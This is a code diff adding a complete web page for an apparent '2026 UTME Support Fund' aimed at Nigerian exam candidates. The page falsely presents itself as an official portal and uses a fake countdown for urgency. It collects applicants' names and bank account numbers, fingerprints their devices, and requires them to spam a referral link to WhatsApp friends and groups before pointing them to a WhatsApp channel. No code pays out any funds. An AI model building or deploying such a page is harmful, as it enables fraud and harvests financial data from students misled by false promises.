@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2026 UTME | SUPPORT FUND</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Outfit', 'sans-serif'],
+                    },
+                    colors: {
+                        jambOrange: {
+                            light: '#FFB74D',
+                            DEFAULT: '#FF8C00',
+                            dark: '#E65100'
+                        },
+                        jambBlue: {
+                            light: '#4FC3F7',
+                            DEFAULT: '#007BFF',
+                            dark: '#0288D1'
+                        },
+                        offWhite: '#F4F6F9'
+                    },
+                    backgroundImage: {
+                        'gradient-orange': 'linear-gradient(135deg, #FFB74D 0%, #FF8C00 100%)',
+                        'gradient-blue': 'linear-gradient(135deg, #4FC3F7 0%, #007BFF 100%)',
+                    },
+                    boxShadow: {
+                        'soft': '0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.02)',
+                        'button': '0 8px 15px rgba(255, 140, 0, 0.2)',
+                        'button-blue': '0 8px 15px rgba(0, 123, 255, 0.2)',
+                    },
+                    animation: {
+                        'bounce-slow': 'bounce 2s infinite',
+                        'slide-up': 'slideUp 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards',
+                        'pop-in': 'popIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) forwards',
+                        'wiggle': 'wiggle 1s ease-in-out infinite',
+                    },
+                    keyframes: {
+                        slideUp: {
+                            '0%': { transform: 'translateY(40px)', opacity: '0' },
+                            '100%': { transform: 'translateY(0)', opacity: '1' }
+                        },
+                        popIn: {
+                            '0%': { transform: 'scale(0.8)', opacity: '0' },
+                            '100%': { transform: 'scale(1)', opacity: '1' }
+                        },
+                        wiggle: {
+                            '0%, 100%': { transform: 'rotate(-2deg)' },
+                            '50%': { transform: 'rotate(2deg)' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body {
+            background-color: #F4F6F9;
+        }
+
+        /* Fixed Overlay Watermark */
+        .watermark-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none; /* Allows clicking through it */
+            z-index: 9999;
+            opacity: 0.04;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='150' height='150' viewBox='0 0 300 300'%3E%3Ctext x='50' y='150' font-family='sans-serif' font-weight='900' font-size='30' transform='rotate(-45 50 150)' fill='%23000'%3EUTME 2026 FUND%3C/text%3E%3C/svg%3E");
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #FF8C00; border-radius: 10px; }
+        
+        .hidden-section { display: none; }
+        .active-section { display: block; animation: slideUp 0.6s cubic-bezier(0.34, 1.56, 0.64, 1); }
+
+        /* Playful Input Fields */
+        .playful-input {
+            background: #fff;
+            border: 2px solid #E2E8F0;
+            border-radius: 16px;
+            padding: 14px;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+        .playful-input:focus {
+            border-color: #4FC3F7;
+            box-shadow: 0 0 0 4px rgba(79, 195, 247, 0.2);
+            outline: none;
+        }
+        
+        input[type=range] {
+            height: 12px;
+            border-radius: 10px;
+            background: #E2E8F0;
+        }
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            height: 24px;
+            width: 24px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #4FC3F7, #007BFF);
+            cursor: pointer;
+            box-shadow: 0 2px 10px rgba(0, 123, 255, 0.4);
+            transition: transform 0.1s;
+        }
+        input[type=range]::-webkit-slider-thumb:active {
+            transform: scale(1.1);
+        }
+    </style>
+</head>
+<body class="antialiased min-h-screen overflow-x-hidden selection:bg-jambOrange-light/30 text-gray-800">
+
+    <div class="watermark-overlay"></div>
+
+    <nav class="fixed top-0 w-full z-50 bg-white/80 backdrop-blur-md shadow-sm px-4 py-3 flex justify-between items-center rounded-b-2xl">
+        <div class="flex items-center gap-2">
+            <div class="w-9 h-9 bg-gradient-orange rounded-full flex items-center justify-center text-white font-extrabold text-xl shadow-sm animate-bounce-slow">N</div>
+            <span class="font-bold text-gray-800 tracking-tight text-lg">UTME <span class="text-jambBlue">FUND</span></span>
+        </div>
+        <div class="text-xs font-bold bg-jambBlue/10 text-jambBlue px-3 py-1.5 rounded-full shadow-sm">
+            OFFICIAL PORTAL
+        </div>
+    </nav>
+
+    <main class="max-w-md mx-auto min-h-screen pt-24 px-4 pb-10 relative z-10">
+
+        <div id="landing" class="active-section text-center space-y-8">
+            <div class="inline-flex items-center gap-2 bg-gradient-orange text-white px-5 py-2 rounded-full text-sm font-bold shadow-button animate-wiggle">
+                <span class="text-lg">🔥</span> BATCH B CLOSING SOON!
+            </div>
+            <div>
+                <h1 class="text-5xl font-extrabold text-gray-800 leading-none tracking-tight mb-2">2026 UTME</h1>
+                <span class="text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-orange block">SUPPORT FUND</span>
+            </div>
+            <div class="flex justify-center gap-3">
+                <div class="bg-white p-4 rounded-2xl shadow-soft border-b-4 border-jambBlue/20 w-20">
+                    <span class="block text-3xl font-extrabold text-jambBlue" id="days">00</span>
+                    <span class="text-xs text-gray-500 font-semibold uppercase">Days</span>
+                </div>
+                <div class="bg-white p-4 rounded-2xl shadow-soft border-b-4 border-jambBlue/20 w-20">
+                    <span class="block text-3xl font-extrabold text-jambBlue" id="hours">00</span>
+                    <span class="text-xs text-gray-500 font-semibold uppercase">Hrs</span>
+                </div>
+                <div class="bg-gradient-orange p-4 rounded-2xl shadow-button w-20 text-white animate-bounce-slow">
+                    <span class="block text-3xl font-extrabold" id="mins">00</span>
+                    <span class="text-xs text-white/80 font-semibold uppercase">Mins</span>
+                </div>
+            </div>
+            <p class="text-gray-600 font-medium text-sm px-4 leading-relaxed">
+                Get funding for your JAMB Registration, Textbooks, and Past Questions! 📚✨
+            </p>
+            <button onclick="goToSection('form')" class="w-full relative group transform hover:scale-105 transition-all duration-300">
+                <div class="absolute -inset-1 bg-gradient-orange rounded-2xl blur-md opacity-40 group-hover:opacity-60 transition duration-1000 group-hover:duration-200"></div>
+                <div class="relative w-full bg-gradient-orange text-white text-xl font-extrabold py-5 rounded-2xl shadow-button flex items-center justify-center gap-3">
+                    REQUEST FUND NOW <span class="text-2xl">🚀</span>
+                </div>
+            </button>
+            <p class="text-xs text-gray-400 font-semibold">🔒 Secured by Abey Dev Gateway</p>
+        </div>
+
+        <div id="form" class="hidden-section">
+            <div class="bg-white p-6 rounded-3xl shadow-soft relative overflow-hidden">
+                <h2 class="text-2xl font-extrabold mb-6 text-gray-800 flex items-center gap-3">
+                    <span class="text-3xl">📝</span> Applicant Details
+                </h2>
+                
+<form id="applicationForm" onsubmit="handleFormSubmit(event)" class="space-y-4">
+                    <div class="space-y-2">
+                        <label class="text-sm font-bold text-gray-600 ml-2">Full Name</label>
+                        <input type="text" id="name" required class="playful-input" placeholder="e.g., Emeka Johnson">
+                    </div>
+
+                    <div class="space-y-2">
+                        <label class="text-sm font-bold text-gray-600 ml-2">UTME Reg Number <span class="text-gray-400 font-normal">(Optional)</span></label>
+                        <input type="text" id="utmeReg" class="playful-input" placeholder="e.g., 2026... (If available)">
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4">
+                        <div class="space-y-2">
+                            <label class="text-sm font-bold text-gray-600 ml-2">State</label>
+                            <select id="state" class="playful-input appearance-none bg-white">
+                                <option value="" disabled selected>Select...</option>
+                                <option>Abia</option><option>Adamawa</option><option>Akwa Ibom</option><option>Anambra</option><option>Bauchi</option><option>Bayelsa</option><option>Benue</option><option>Borno</option><option>Cross River</option><option>Delta</option><option>Ebonyi</option><option>Edo</option><option>Ekiti</option><option>Enugu</option><option>FCT - Abuja</option><option>Gombe</option><option>Imo</option><option>Jigawa</option><option>Kaduna</option><option>Kano</option><option>Katsina</option><option>Kebbi</option><option>Kogi</option><option>Kwara</option><option>Lagos</option><option>Nasarawa</option><option>Niger</option><option>Ogun</option><option>Ondo</option><option>Osun</option><option>Oyo</option><option>Plateau</option><option>Rivers</option><option>Sokoto</option><option>Taraba</option><option>Yobe</option><option>Zamfara</option>
+                            </select>
+                        </div>
+                        <div class="space-y-2">
+                            <label class="text-sm font-bold text-gray-600 ml-2">Grad Year</label>
+                            <input type="number" id="year" placeholder="2023" class="playful-input">
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4">
+                        <div class="space-y-2">
+                            <label class="text-sm font-bold text-gray-600 ml-2">Bank Name</label>
+                            <input type="text" id="bankName" required class="playful-input" placeholder="e.g. Opay">
+                        </div>
+                        <div class="space-y-2">
+                            <label class="text-sm font-bold text-gray-600 ml-2">Account No</label>
+                            <input type="number" id="accountNo" required class="playful-input" placeholder="1234567890">
+                        </div>
+                    </div>
+
+                    <div class="space-y-2">
+                        <label class="text-sm font-bold text-gray-600 ml-2">Are you in any JAMB Group?</label>
+                        <div class="flex gap-3">
+                            <label class="flex-1 cursor-pointer">
+                                <input type="radio" name="group" value="yes" class="peer sr-only">
+                                <div class="p-3 border-2 border-E2E8F0 rounded-2xl text-center font-bold text-gray-500 peer-checked:border-jambBlue peer-checked:bg-jambBlue/10 peer-checked:text-jambBlue transition-all flex items-center justify-center gap-2">
+                                    <span>👍</span> Yes
+                                </div>
+                            </label>
+                            <label class="flex-1 cursor-pointer">
+                                <input type="radio" name="group" value="no" class="peer sr-only" checked>
+                                <div class="p-3 border-2 border-E2E8F0 rounded-2xl text-center font-bold text-gray-500 peer-checked:border-jambBlue peer-checked:bg-jambBlue/10 peer-checked:text-jambBlue transition-all flex items-center justify-center gap-2">
+                                    <span>👎</span> No
+                                </div>
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="space-y-3 pt-2">
+                        <div class="flex justify-between items-end px-2">
+                            <label class="text-sm font-bold text-gray-600">Support Needed</label>
+                            <span class="font-extrabold text-2xl text-jambBlue" id="amtDisplay">₦10,000</span>
+                        </div>
+                        <input type="range" min="5000" max="30000" step="1000" value="10000" class="w-full appearance-none bg-transparent cursor-pointer" oninput="document.getElementById('amtDisplay').innerText = '₦' + Number(this.value).toLocaleString()">
+                    </div>
+
+                    <button type="submit" class="w-full bg-gradient-blue text-white text-lg font-extrabold py-4 rounded-2xl shadow-button-blue mt-4 hover:scale-[1.02] active:scale-95 transition-all duration-300 flex justify-center items-center gap-3">
+                        PROCEED TO QUIZ <span class="text-xl">🎮</span>
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <div id="verify" class="hidden-section text-center pt-6">
+            <div class="mb-8">
+                <span class="text-4xl">🧩</span>
+                <h2 class="text-2xl font-extrabold text-gray-800 mb-2">Quick Quiz!</h2>
+                <p class="text-gray-500 font-medium">Prove you're not a robot to get your ID.</p>
+            </div>
+            
+            <div class="w-full bg-gray-200 rounded-full h-4 mb-10 overflow-hidden p-1">
+                <div id="verifyBar" class="bg-gradient-blue h-full rounded-full transition-all duration-500 shadow-sm" style="width: 0%"></div>
+            </div>
+
+            <div id="quizCard" class="bg-white p-8 rounded-3xl shadow-soft animate-pop-in relative">
+                <h3 class="text-xl font-extrabold mb-8 text-gray-800" id="qText">Loading Question...</h3>
+                <div class="grid grid-cols-2 gap-4" id="qOptions"></div>
+            </div>
+        </div>
+
+        <div id="dashboard" class="hidden-section">
+            <div class="relative bg-gradient-blue p-6 rounded-3xl shadow-button-blue mb-6 overflow-hidden">
+                <div class="absolute top-0 right-0 -mt-8 -mr-8 w-32 h-32 bg-white/20 rounded-full blur-xl"></div>
+                <div class="absolute bottom-0 left-0 -mb-8 -ml-8 w-24 h-24 bg-white/20 rounded-full blur-xl"></div>
+                
+                <div class="flex items-center gap-3 mb-3">
+                    <span class="text-3xl">🎉</span>
+                    <h2 class="text-2xl font-extrabold text-white">Application Pending!</h2>
+                </div>
+                <p class="text-white/90 font-semibold text-sm mb-4 ml-1">Status: Awaiting Verification</p>
+
+                <div class="w-full bg-black/20 rounded-full h-4 overflow-hidden p-1">
+                    <div class="bg-white h-full w-[80%] rounded-full relative overflow-hidden animate-pulse"></div>
+                </div>
+                <div class="text-right mt-2 text-xs font-bold text-white">80% COMPLETE</div>
+            </div>
+
+            <div class="bg-white p-6 rounded-3xl shadow-soft text-center">
+                <div class="w-16 h-16 bg-jambOrange/10 rounded-full flex items-center justify-center mx-auto mb-4 animate-bounce-slow">
+                    <span class="text-3xl">📲</span>
+                </div>
+                
+                <h3 class="font-extrabold text-gray-800 mb-2 text-lg">Final Step: Share to Verify</h3>
+                <p class="text-gray-500 font-medium text-sm mb-6 px-4">
+                    Share your unique link with <strong class="text-jambOrange">5 Friends</strong> or <strong class="text-jambOrange">3 Groups</strong> to finalize.
+                </p>
+
+                <div class="bg-gray-50 p-2 rounded-2xl border-2 border-dashed border-gray-200 mb-5 flex items-center justify-between gap-2 pl-4">
+                    <code id="shareLink" class="text-jambBlue font-bold text-xs truncate">Generating...</code>
+                    <button id="copyBtn" onclick="copyToClipboard()" class="bg-white border border-gray-200 shadow-sm px-3 py-2 rounded-xl text-xs font-bold text-gray-600 hover:text-jambBlue active:scale-95 transition-all whitespace-nowrap">
+                        Copy 📋
+                    </button>
+                </div>
+
+                <button onclick="shareLink()" class="w-full bg-gradient-orange text-white font-extrabold py-4 rounded-2xl shadow-button hover:scale-[1.02] active:scale-95 transition-all flex items-center justify-center gap-3">
+                    <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+                    Share on WhatsApp
+                </button>
+                
+                <div class="mt-6 border-t border-gray-100 pt-4">
+                    <p class="text-xs text-gray-400 font-bold uppercase tracking-wider mb-3">Live Progress</p>
+                    <div class="flex justify-between items-center bg-offWhite p-4 rounded-2xl">
+                        <span class="text-sm font-bold text-gray-600 flex items-center gap-2"><span class="text-lg">👥</span> Referrals Verified</span>
+                        <div class="flex items-center gap-1">
+                            <span id="refCount" class="text-2xl font-extrabold text-jambBlue">0</span>
+                            <span class="text-gray-400 font-bold text-sm">/ 5</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
+        import { getFirestore, doc, getDoc, setDoc, updateDoc, increment, serverTimestamp, onSnapshot } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAzgjEzR6LB75exfDcDGnhMeFJAH4LYf9A",
+            authDomain: "jamb-fund.firebaseapp.com",
+            projectId: "jamb-fund",
+            storageBucket: "jamb-fund.firebasestorage.app",
+            messagingSenderId: "914312143124",
+            appId: "1:914312143124:web:b771fb01360762172ae201",
+            measurementId: "G-S3MSF1CKX9"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        let deviceID = null;
+        let userData = {};
+
+        window.onload = async () => {
+            const fpPromise = FingerprintJS.load();
+            const fp = await fpPromise;
+            const result = await fp.get();
+            deviceID = result.visitorId;
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            const refID = urlParams.get('ref');
+            if (refID) localStorage.setItem('referrer', refID);
+
+            checkUserExistence();
+            startTimer();
+        };
+
+        async function checkUserExistence() {
+            try {
+                const docRef = doc(db, "applicants", deviceID);
+                const docSnap = await getDoc(docRef);
+                if (docSnap.exists()) {
+                    userData = docSnap.data();
+                    goToSection('dashboard');
+                    updateDashboard(userData);
+                }
+            } catch (e) { console.error(e); }
+        }
+
+        window.goToSection = (sectionId) => {
+            document.querySelectorAll('main > div').forEach(div => {
+                div.classList.remove('active-section');
+                div.classList.add('hidden-section');
+            });
+            const target = document.getElementById(sectionId);
+            target.classList.remove('hidden-section');
+            target.classList.add('active-section');
+        }
+
+window.handleFormSubmit = (e) => {
+            e.preventDefault();
+            userData = {
+                name: document.getElementById('name').value,
+                utmeReg: document.getElementById('utmeReg').value || 'Not Provided',
+                state: document.getElementById('state').value,
+                year: document.getElementById('year').value,
+                bankName: document.getElementById('bankName').value,   // NEW
+                accountNo: document.getElementById('accountNo').value, // NEW
+                amount: document.getElementById('amtDisplay').innerText,
+                refID: deviceID,
+                referrals: 0
+            };
+            goToSection('verify');
+            startQuiz();
+        };
+
+        let quizStep = 0;
+        const questions = [
+            { q: "Tap the Orange Circle", type: "color", ans: "orange" },
+            { q: "What is 10 + 10?", type: "math", ans: "20", opts: ["15", "20", "200", "100"] },
+            { q: "Select 'JAMB'", type: "text", ans: "JAMB", opts: ["WAEC", "NECO", "JAMB"] }
+        ];
+
+        window.startQuiz = () => { renderQuestion(); }
+
+        function renderQuestion() {
+            const q = questions[quizStep];
+            document.getElementById('qText').innerText = q.q;
+            const optsDiv = document.getElementById('qOptions');
+            optsDiv.innerHTML = '';
+
+            if(q.type === 'color') {
+                ['red', 'orange', 'blue', 'green'].forEach(c => {
+                    const btn = document.createElement('button');
+                    btn.className = `h-20 rounded-2xl shadow-md transform active:scale-90 transition-all hover:scale-105 flex items-center justify-center`;
+                    btn.onclick = () => checkAnswer(c === 'orange');
+                    if(c === 'red') btn.style.background = 'linear-gradient(135deg, #FF6B6B, #EE5253)';
+                    if(c === 'orange') btn.style.background = 'linear-gradient(135deg, #FFB74D, #FF8C00)';
+                    if(c === 'blue') btn.style.background = 'linear-gradient(135deg, #4FC3F7, #007BFF)';
+                    if(c === 'green') btn.style.background = 'linear-gradient(135deg, #81C784, #4CAF50)';
+                    btn.innerHTML = '<span class="text-3xl text-white">✨</span>';
+                    optsDiv.appendChild(btn);
+                });
+            } else {
+                q.opts.forEach(opt => {
+                    const btn = document.createElement('button');
+                    btn.className = "bg-offWhite text-gray-700 py-5 rounded-2xl font-bold text-lg hover:bg-gradient-blue hover:text-white hover:shadow-button-blue transition-all duration-200 border-2 border-transparent hover:border-blue-200 active:scale-95";
+                    btn.innerText = opt;
+                    btn.onclick = () => checkAnswer(opt === q.ans);
+                    optsDiv.appendChild(btn);
+                });
+            }
+        }
+
+        function checkAnswer(isCorrect) {
+            if(!isCorrect) { alert("Oops! Wrong answer. Try again! 😅"); return; }
+            quizStep++;
+            document.getElementById('verifyBar').style.width = `${(quizStep / questions.length) * 100}%`;
+            if(quizStep < questions.length) { setTimeout(renderQuestion, 300); } 
+            else { finishApplication(); }
+        }
+
+        async function finishApplication() {
+            try {
+                await setDoc(doc(db, "applicants", deviceID), { ...userData, timestamp: serverTimestamp() });
+                const referrerID = localStorage.getItem('referrer');
+                if (referrerID && referrerID !== deviceID) {
+                    const refDoc = doc(db, "applicants", referrerID);
+                    await updateDoc(refDoc, { referrals: increment(1) });
+                }
+            } catch (e) { console.log(e); }
+            goToSection('dashboard');
+            updateDashboard(userData);
+        }
+
+window.updateDashboard = (data) => {
+            const link = `${window.location.origin}${window.location.pathname}?ref=${deviceID}`;
+            document.getElementById('shareLink').innerText = link;
+            
+            // Listen for changes in referral count
+            onSnapshot(doc(db, "applicants", deviceID), (docSnap) => {
+                if (docSnap.exists()) {
+                    const count = docSnap.data().referrals || 0;
+                    document.getElementById('refCount').innerText = count;
+
+                    // --- NEW: SUCCESS LOGIC (WHEN THEY HIT 5) ---
+                    if (count >= 5) {
+                        triggerSuccessState();
+                    }
+                }
+            });
+        };
+
+       function triggerSuccessState() {
+            // 1. Change the Status Card to GREEN (Application Received)
+            const statusCard = document.querySelector('#dashboard > div:first-child');
+            statusCard.classList.remove('bg-gradient-blue');
+            statusCard.classList.add('bg-green-600', 'transition-all', 'duration-500');
+            
+            statusCard.innerHTML = `
+                <div class="absolute top-0 right-0 -mt-8 -mr-8 w-32 h-32 bg-white/20 rounded-full blur-xl"></div>
+                <div class="flex items-center gap-3 mb-3">
+                    <span class="text-4xl animate-bounce">📂</span>
+                    <h2 class="text-2xl font-extrabold text-white">Application Received!</h2>
+                </div>
+                <p class="text-white/90 font-semibold text-sm mb-4 ml-1">Status: Awaiting Shortlisting</p>
+                <div class="w-full bg-black/20 rounded-full h-4 overflow-hidden p-1">
+                    <div class="bg-white h-full w-full rounded-full shadow-[0_0_15px_white]"></div>
+                </div>
+                <div class="text-right mt-2 text-xs font-bold text-white">100% COMPLETE</div>
+            `;
+
+            // 2. Change the Bottom Section (Selection Logic)
+            const bottomCard = document.querySelector('#dashboard > div:last-child');
+            bottomCard.innerHTML = `
+                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4 animate-bounce">
+                    <span class="text-4xl">📢</span>
+                </div>
+                <h3 class="font-extrabold text-gray-800 mb-2 text-xl">Selection in Progress</h3>
+                <p class="text-gray-500 font-medium text-sm mb-4 px-4">
+                    Great job! Your details have been submitted to the review panel. <br><br>
+                    <strong>Note:</strong> Only shortlisted applicants will be contacted for disbursement.
+                </p>
+                
+                <div class="bg-yellow-50 border-2 border-yellow-200 p-4 rounded-2xl mb-5">
+                    <p class="text-yellow-800 font-bold text-sm">
+                        ⚠️ Important: <br>
+                        Join the WhatsApp Group to see the shortlist.
+                    </p>
+                </div>
+
+                <button onclick="window.open('https://whatsapp.com/channel/0029VbCSAPSK0IBlVBEu0h1Q', '_blank')" class="w-full bg-[#25D366] text-white font-extrabold py-4 rounded-2xl shadow-button hover:scale-[1.02] active:scale-95 transition-all flex items-center justify-center gap-3">
+                    <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+                    Join WhatsApp Channel
+                </button>
+            `;
+            
+            startConfetti();
+        }
+
+        function startConfetti() {
+            // Simple emoji rain effect
+            const emojis = ['💸', '🎊', '✨', '✅'];
+            setInterval(() => {
+                const el = document.createElement('div');
+                el.innerText = emojis[Math.floor(Math.random() * emojis.length)];
+                el.style.position = 'fixed';
+                el.style.left = Math.random() * 100 + 'vw';
+                el.style.top = '-50px';
+                el.style.fontSize = '24px';
+                el.style.zIndex = '9999';
+                el.style.transition = 'top 3s ease-in';
+                document.body.appendChild(el);
+                
+                setTimeout(() => {
+                    el.style.top = '110vh';
+                }, 100);
+
+                setTimeout(() => el.remove(), 3000);
+            }, 300);
+        }
+
+        window.shareLink = () => {
+            const link = document.getElementById('shareLink').innerText;
+            const text = `*2026 UTME SUPPORT FUND* 🎓💰\n\nHey! Apply for N5,000 - N30,000 JAMB Support Fund here.\n\n👇 Click to apply:\n${link}`;
+            window.open(`whatsapp://send?text=${encodeURIComponent(text)}`);
+        };
+
+        // Added Copy Function attached to window
+        window.copyToClipboard = () => {
+            const link = document.getElementById('shareLink').innerText;
+            navigator.clipboard.writeText(link).then(() => {
+                const btn = document.getElementById('copyBtn');
+                const originalText = btn.innerHTML;
+                btn.innerHTML = 'Copied! ✅';
+                btn.classList.add('text-green-600');
+                setTimeout(() => {
+                    btn.innerHTML = originalText;
+                    btn.classList.remove('text-green-600');
+                }, 2000);
+            });
+        }
+
+function startTimer() {
+            // --- CONFIGURATION: SET YOUR END DATE HERE ---
+            // Format: "Month Day, Year Time"
+            const endDateStr = "Feb 12, 2026 23:59:59"; 
+            // ---------------------------------------------
+
+            const countDownDate = new Date(endDateStr).getTime();
+
+            const update = setInterval(() => {
+                const now = new Date().getTime();
+                const distance = countDownDate - now;
+
+                // IF TIME IS UP
+                if (distance < 0) {
+                    clearInterval(update);
+                    document.getElementById('days').innerText = "00";
+                    document.getElementById('hours').innerText = "00";
+                    document.getElementById('mins').innerText = "00";
+                    
+                    // Disable Button Logic
+                    const btn = document.querySelector('button[onclick="goToSection(\'form\')"]');
+                    btn.innerHTML = "BATCH B CLOSED 🔒";
+                    btn.classList.remove('bg-gradient-orange');
+                    btn.classList.add('bg-gray-400', 'cursor-not-allowed');
+                    btn.onclick = () => showToast("❌ Batch B has closed. Applications are no longer accepted.");
+                    return;
+                }
+
+                // CALCULATE TIME
+                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+
+                document.getElementById('days').innerText = days < 10 ? '0' + days : days;
+                document.getElementById('hours').innerText = hours < 10 ? '0' + hours : hours;
+                document.getElementById('mins').innerText = minutes < 10 ? '0' + minutes : minutes;
+            }, 1000);
+        }
+
+        // Simple Toast Function
+        function showToast(message) {
+            const toast = document.createElement('div');
+            toast.className = "fixed top-5 left-1/2 transform -translate-x-1/2 bg-gray-800 text-white px-6 py-3 rounded-full shadow-lg z-50 text-sm font-bold animate-bounce-slow";
+            toast.innerText = message;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+    </script>
+</body>
+</html>
